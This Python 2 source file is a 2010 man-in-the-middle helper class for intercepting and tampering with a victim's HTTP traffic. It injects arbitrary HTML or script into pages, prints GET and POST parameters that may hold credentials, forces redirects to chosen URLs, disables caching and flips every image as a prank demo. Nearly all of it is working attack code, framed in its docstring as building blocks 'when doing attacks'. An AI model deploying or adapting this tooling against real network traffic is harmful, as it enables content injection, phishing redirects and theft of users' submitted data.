#!/usr/bin/env python
'''
A class providing some very common functions
that a MITM might need to use.

For usage help, see example UserMITM.py provided
in this package.
'''

#Required for upsidedownternet
#Comment out if you don't want it:P
from PIL import Image,ImageFile 
from cStringIO import StringIO
import re


__author__ = "Ben Schmidt"
__copyright__ = "Copyright 2010, Ben Schmidt"
__credits__ = ["Ben Schmidt"]
__license__ = "GPL v3"
__version__ = "0.1"
__maintainer__ = "Ben Schmidt"
__email__ = "supernothing@spareclockcycles.org"
__status__ = "beta"

class MITM:
    '''
        MITM Class provides some default functions that you will most likely need
        at some point when doing attacks. Almost every desired attack should be
        able to be constructed simply by combining these in interesting ways.
        
        Important variables:
        self.reply.data -> Contains the decompressed, readable payload. Content-Length
        and compression will be reapplied automagically (as needed) so edit as much
        as you want, and it'll get through.
        
        self.reply.response_headers -> Dictionary containing the response headers received
        from the server. Useful for doing things like stripping gzip encoding,
        messing
        
        self.reply.message -> Contains the HTTP response code string.
        
        self.req.args -> Contains POST or GET parameters
    '''        
    def __init__(self,req_funcs,reply_funcs):
        self.req_funcs = req_funcs
        self.reply_funcs = reply_funcs
        self.pre,self.post = [],[]
    def process_reply(self,reply):
        self.reply = reply
        if self.reply==None:
            return
        else:
            for a in self.reply_funcs: a()
    def process_request(self,req):
        self.req = req
        for a in self.req_funcs: a()
    def print_reply(self):
        print self.reply.uri
        print self.reply.data
    def print_request(self):
        print self.req.uri
        print self.req.args
    def insert_html(self,pre=[],post=[],re_flags=re.I):
        '''
        To use this function, simply pass a list of tuples of the form:
        
        (string/regex_to_match,html_to_inject)
        
        NOTE: Matching will be case insensitive unless differnt flags are given
        
        The pre array will have the match in front of your injected code, the post
        will put the match behind it.
        '''
        pre_regexes = [re.compile(r"(?P<match>"+i[0]+")",re_flags) for i in pre]
        post_regexes = [re.compile(r"(?P<match>"+i[0]+")",re_flags) for i in post]
            
        if self.is_html():
            for i,r in enumerate(pre_regexes):
                self.reply.data=re.sub(r,"\g<match>"+pre[i][1],self.reply.data)
            for i,r in enumerate(post_regexes):
                self.reply.data=re.sub(r,post[i][1]+"\g<match>",self.reply.data)
    
    def get_img_type(self,path):
        '''
        Utility function for image
        '''
        if self.check_mimetype("image/jpeg"):
            return "JPEG"
        elif self.check_mimetype("image/png"):
            return "PNG"
        elif self.check_mimetype("image/gif"):
            return "GIF"
    
    def check_mimetype(self,type):
        if 'Content-Type' in self.reply.response_headers and\
        self.reply.response_headers['Content-Type'].find(type)!=-1:
            return True
        else:
            return False
        
    
    def is_html(self):
        '''Check if MIME type indicates an HTML file'''
        if self.check_mimetype("text/html"):
            return True
        else:
            return False
    
    def is_image(self):
        '''Check if MIME type indicates an image'''
        if self.check_mimetype("image"):
            return True
        else:
            return False
    
    def upsidedownternet(self):
        '''
        A demonstration of what can be done with our MITM.
        Here, we see an implementation of the Upsidedownternet, in which every
        image for the victim will be flipped upside down. Useless, yes, but fun
        nevertheless.
        '''
        
        path = self.reply.rest.lower()
        if self.is_image():
            try:
                image_type=self.get_img_type(self)
                #For some reason more images get parsed using the parser
                #rather than a file...PIL still needs some work I guess
                p = ImageFile.Parser()
                p.feed(self.reply.data)
                im = p.close()
                im=im.transpose(Image.ROTATE_180)
                output = StringIO()
                im.save(output,format=image_type)
                self.reply.data=output.getvalue()
                output.close()
            except Exception as e:
                print e
                pass
    
    def kill_cache(self):
        if "Expires" not in self.reply.response_headers:
            self.rh_list.append("Expires")
        self.reply.response_headers['Expires']="0"
    
    def redirect(self,mimetype,url):
        if self.check_mimetype(mimetype) and url.find(self.reply.host+self.reply.uri)!=-1:
            self.reply.message = "HTTP/1.0 302 Found"
            self.reply.response_headers = {"Location":url}
            self.reply.data = ""
            
    def redirect_host(self,mimetype,url,host):
        if host==self.reply.host:
            self.redirect(mimetype,url)
            
    def print_args(self):
        print self.req
        print self.req.args
        
        
